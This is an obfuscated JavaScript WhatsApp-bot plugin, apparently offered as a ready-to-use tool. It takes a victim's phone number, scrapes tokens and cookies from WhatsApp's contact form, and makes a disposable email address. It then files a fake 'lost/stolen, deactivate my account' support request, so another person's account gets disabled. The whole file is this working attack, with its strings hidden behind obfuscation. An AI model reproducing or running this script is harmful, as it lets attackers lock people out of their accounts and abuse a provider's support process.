//GURU

function _0x4424() {
  const _0x232003 = [
    'your_message',
    '##-\x20WhatsApp\x20Support\x20-##\x0a\x0aHii:\x0a\x0aThank\x20you\x20for\x20your\x20message.\x0a\x0aTo\x20proceed\x20with\x20your\x20request,\x20we\x20need\x20you\x20to\x20verify\x20that\x20this\x20phone\x20number\x20belongs\x20to\x20you.\x20Please\x20send\x20us\x20documentation\x20that\x20allows\x20us\x20to\x20verify\x20that\x20the\x20number\x20is\x20your\x20property,\x20such\x20as\x20a\x20copy\x20of\x20the\x20telephone\x20bill\x20or\x20service\x20contract.\x0a\x0a\x20Please\x20make\x20sure\x20to\x20enter\x20your\x20phone\x20number\x20in\x20full\x20international\x20format.\x20For\x20more\x20information\x20on\x20the\x20international\x20format,\x20see\x20this\x20article.\x0a\x0aIf\x20you\x20have\x20any\x20other\x20questions\x20or\x20concerns,\x20please\x20do\x20not\x20hesitate\x20to\x20contact\x20us.\x20We\x20will\x20be\x20happy\x20to\x20help\x20you..',
    '##-\x20WhatsApp\x20Support\x20-##\x0a\x0aHi,\x0a\x0aThank\x20you\x20for\x20your\x20message.\x0a\x0aWe\x20have\x20deactivated\x20your\x20WhatsApp\x20account.\x20This\x20means\x20your\x20account\x20is\x20temporarily\x20disabled\x20and\x20will\x20be\x20automatically\x20deleted\x20in\x2030\x20days\x20if\x20you\x20don\x27t\x20re-register\x20the\x20account.\x20Please\x20note:\x20WhatsApp\x20Customer\x20Support\x20cannot\x20delete\x20your\x20account\x20manually.\x20During\x20the\x20lockdown\x20period:\x0a\x0a•\x20Your\x20contacts\x20on\x20WhatsApp\x20may\x20still\x20see\x20your\x20name\x20and\x20profile\x20picture.\x0a\x0aAny\x20messages\x20your\x20contacts\x20may\x20send\x20to\x20the\x20account\x20will\x20remain\x20in\x20pending\x20status\x20for\x20up\x20to\x2030\x20days.\x0a\x0aIf\x20you\x20wish\x20to\x20recover\x20your\x20account,\x20please\x20re-register\x20your\x20account\x20as\x20soon\x20as\x20possible.Re-register\x20your\x20account\x20by\x20entering\x20the\x206-digit\x20code,\x20the\x20code\x20you\x20receive\x20by\x20SMS\x20or\x20phone\x20call.\x20If\x20you\x20re-register\x20If\x20you\x20have\x20any\x20other\x20questions\x20or\x20concerns,\x20please\x20do\x20not\x20hesitate\x20to\x20contact\x20us.\x20We\x20will\x20be\x20happy\x20to\x20help!',
    'format',
    'https://www.whatsapp.com',
    'dpr',
    '91227uCKxLP',
    '10DFnPtT',
    'get',
    'form',
    'join',
    'set-cookie',
    'country_selector',
    'platform',
    '318282qjDgsc',
    'reply',
    '__rev',
    '2535995ueGbgy',
    '__user',
    'append',
    'ANDROID',
    '681044qbjiac',
    '19316.BP:whatsapp_www_pkg.2.0.0.0.0',
    'Perdido/roubado:\x20desative\x20minha\x20conta:\x20',
    'find',
    'email_confirm',
    '793728oKzxnE',
    'input[name=jazoest]',
    'replace',
    'load',
    'for\x20(;;);',
    'data',
    '\x22payload\x22:false',
    'attr',
    '1465nBacTn',
    '12697119oIhjys',
    'POST',
    'href',
    'input[name=lsd]',
    '2224Jsemfm',
    '*ENTER\x20THE\x20NUMBER\x20IN\x20INTERNATIONAL\x20FORMAT,\x20EXAMPLE:\x20+𝟷\x20(915)\x20555-555*',
    'submit',
    '16CUkiYA',
    'headers',
    '1006630858',
    '\x22payload\x22:true',
    'parse',
    '__ccg',
    'includes',
    '__comment_req',
    'email',
    'step',
    '__req',
    'https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10',
    'val',
    '__hs',
    'phone_number',
    'command',
  ]
  _0x4424 = function () {
    return _0x232003
  }
  return _0x4424()
}
const _0x206d10 = _0x4d0c
;(function (_0x5f191c, _0x2419b6) {
  const _0x157ef1 = _0x4d0c,
    _0x487b6e = _0x5f191c()
  while (!![]) {
    try {
      const _0x167b64 =
        -parseInt(_0x157ef1(0xaa)) / 0x1 +
        -parseInt(_0x157ef1(0xb9)) / 0x2 +
        parseInt(_0x157ef1(0xb2)) / 0x3 +
        (-parseInt(_0x157ef1(0x91)) / 0x4) * (-parseInt(_0x157ef1(0x8c)) / 0x5) +
        -parseInt(_0x157ef1(0x84)) / 0x6 +
        (parseInt(_0x157ef1(0xb5)) / 0x7) * (-parseInt(_0x157ef1(0x94)) / 0x8) +
        (parseInt(_0x157ef1(0x8d)) / 0x9) * (parseInt(_0x157ef1(0xab)) / 0xa)
      if (_0x167b64 === _0x2419b6) break
      else _0x487b6e['push'](_0x487b6e['shift']())
    } catch (_0x39bee2) {
      _0x487b6e['push'](_0x487b6e['shift']())
    }
  }
})(_0x4424, 0x5f812)
import * as cheerio from 'cheerio'
import _0x44a3b3 from 'axios'
import _0x45d267 from 'util'
let handler = async (
  _0x4230d6,
  {
    conn: _0x8a0c7c,
    isOwner: _0x1c166d,
    usedPrefix: _0x527421,
    command: _0x224588,
    args: _0x28070a,
  }
) => {
  const _0x2c1f13 = _0x4d0c,
    _0x38ac55 = _0x28070a['join']('\x20')
  if (!_0x38ac55 || !_0x28070a[0x0]) throw _0x2c1f13(0x92)
  let _0x16a5c7 = await _0x44a3b3[_0x2c1f13(0xac)]('https://www.whatsapp.com/contact/noclient/'),
    _0x427b3b = await _0x44a3b3[_0x2c1f13(0xac)](_0x2c1f13(0x9f)),
    _0x1d5e3f = _0x16a5c7[_0x2c1f13(0x95)][_0x2c1f13(0xaf)][_0x2c1f13(0xae)](';\x20'),
    _0x183702 = cheerio[_0x2c1f13(0x87)](_0x16a5c7[_0x2c1f13(0x89)]),
    _0x59e950 = _0x183702(_0x2c1f13(0xad)),
    _0x3b484c = new URL(_0x59e950[_0x2c1f13(0x8b)]('action'), _0x2c1f13(0xa8))[_0x2c1f13(0x8f)],
    _0x1fd9e2 = new URLSearchParams()
  _0x1fd9e2[_0x2c1f13(0xb7)]('jazoest', _0x59e950['find'](_0x2c1f13(0x85))[_0x2c1f13(0xa0)]()),
    _0x1fd9e2[_0x2c1f13(0xb7)]('lsd', _0x59e950[_0x2c1f13(0xbc)](_0x2c1f13(0x90))['val']()),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x9d), _0x2c1f13(0x93)),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xb0), 'ID'),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xa2), _0x38ac55),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x9c), _0x427b3b[_0x2c1f13(0x89)][0x0]),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x83), _0x427b3b[_0x2c1f13(0x89)][0x0]),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xb1), _0x2c1f13(0xb8)),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xa4), _0x2c1f13(0xbb) + _0x38ac55),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xb6), '0'),
    _0x1fd9e2[_0x2c1f13(0xb7)]('__a', '1'),
    _0x1fd9e2[_0x2c1f13(0xb7)]('__csr', ''),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x9e), '8'),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xa1), _0x2c1f13(0xba)),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xa9), '1'),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x99), 'UNKNOWN'),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0xb4), _0x2c1f13(0x96)),
    _0x1fd9e2[_0x2c1f13(0xb7)](_0x2c1f13(0x9b), '0')
  let _0x3415fe = await _0x44a3b3({
    url: _0x3b484c,
    method: _0x2c1f13(0x8e),
    data: _0x1fd9e2,
    headers: { cookie: _0x1d5e3f },
  })
  var _0x5cce88 = String(_0x3415fe[_0x2c1f13(0x89)])
  if (_0x5cce88[_0x2c1f13(0x9a)](_0x2c1f13(0x97))) _0x4230d6[_0x2c1f13(0xb3)](_0x2c1f13(0xa6))
  else {
    if (_0x5cce88[_0x2c1f13(0x9a)](_0x2c1f13(0x8a))) _0x4230d6[_0x2c1f13(0xb3)](_0x2c1f13(0xa5))
    else
      _0x4230d6[_0x2c1f13(0xb3)](
        _0x45d267[_0x2c1f13(0xa7)](
          JSON[_0x2c1f13(0x98)](_0x3415fe[_0x2c1f13(0x89)][_0x2c1f13(0x86)](_0x2c1f13(0x88), ''))
        )
      )
  }
}
;(handler[_0x206d10(0xa3)] = /^(supportwa|swa|logout|support|deactivatewa|mandsupport)$/i),
  (handler['owner'] = !![])
function _0x4d0c(_0x5c832d, _0x2d8c4b) {
  const _0x44247a = _0x4424()
  return (
    (_0x4d0c = function (_0x4d0cec, _0x1283bf) {
      _0x4d0cec = _0x4d0cec - 0x83
      let _0x595331 = _0x44247a[_0x4d0cec]
      return _0x595331
    }),
    _0x4d0c(_0x5c832d, _0x2d8c4b)
  )
}
export default handler
